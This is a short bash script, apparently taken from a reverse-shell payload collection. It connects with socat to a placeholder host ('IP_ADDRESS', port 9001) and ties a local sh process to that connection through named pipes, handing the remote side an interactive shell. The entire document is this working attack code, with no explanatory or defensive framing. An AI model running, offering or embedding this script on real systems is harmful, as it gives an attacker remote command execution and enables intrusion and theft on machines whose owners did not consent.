#Linux / Unix
#!/bin/bash

# Requires socat and mkfifo

HOST="IP_ADDRESS"
PORT=9001

# Create named pipes for communication
PIPE_IN=$(mktemp -u)
PIPE_OUT=$(mktemp -u)
mkfifo "$PIPE_IN"
mkfifo "$PIPE_OUT"

# Connect to remote host and redirect input/output through pipes
# socat will handle bidirectional communication
socat -d -d TCP:$HOST:$PORT PIPE:"$PIPE_IN",rdonly PIPE:"$PIPE_OUT",wronly &

SOCAT_PID=$!

# Run shell with input from PIPE_IN and output to PIPE_OUT
sh <"$PIPE_IN" >"$PIPE_OUT" 2>&1 &

SH_PID=$!

# Cleanup function
cleanup() {
    kill $SOCAT_PID $SH_PID 2>/dev/null
    rm -f "$PIPE_IN" "$PIPE_OUT"
    exit
}

trap cleanup INT TERM

# Wait for shell process to finish
wait $SH_PID

cleanup